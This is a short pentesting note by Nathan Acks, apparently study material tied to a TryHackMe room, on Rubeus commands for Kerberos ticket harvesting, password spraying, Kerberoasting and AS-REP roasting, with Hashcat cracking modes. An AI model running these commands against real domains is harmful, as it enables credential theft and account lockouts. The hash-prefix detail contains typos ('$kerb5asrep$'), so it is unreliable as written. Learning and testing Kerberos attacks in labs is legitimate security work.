# Using Rubeus

Rubeus is a Windows-only post-exploitation tool for attacking Kerberos. No compiled binaries are available (either through the GitHub repo or Kali Linux’s `windows-binaries` package).

NOTE: To use Rebueus you need to already be on the domain you are attacking, or alternately need to have mapped the domain controller (which normally hosts the KDC) IP address properly in C:/Windows/System32/drivers/etc/hosts.

## Harvest Kerberos Tickets

```powershell
# Harvest ticket granting tickets observed by the current
# machine. Probably works best when run on a domain
# controller.
#
Rubeus.exe harvest /interval:30
```

## Password Spraying

```powershell
# Spray the specified password across all known users and
# generate a ticket giving ticket for successful
# authentications. (Can trigger account lockouts!)
#
Rubeus.exe brute /password:ThePasswordToSpray /noticket
```

## Kerberoasting

```powershell
# Extract password hashes for all known kerberoastable
# accounts using Rubeus.
#
Rubeus.exe kerberoast
```

The password hashes output here can then be cracked with Hashcat (use the 13100 hash mode).

## AS-REP Roasting

```powershell
# AS-REP roasting with Rubeus.
#
Rubeus.exe asreproast
```

To use Hashcat to crack the hashes obtained in this fashin, first insert `23$` after the leading `$kerb5asrep$` (so `$kerb5asrep$` → `$kerb5asrep$23$`) and then use mode 18200.

## References

* [Rubeus](https://github.com/GhostPack/Rubeus)
* [TryHackMe: Attacking Kerberos](tryhackme-attacking-kerberos.md)
* [Kerberos](kerberos.md)
* [Using Hashcat](hashcat.md)

- - - -

<span aria-hidden="true">👤</span> Nathan Acks  
<span aria-hidden="true">📅</span> December 6, 2021
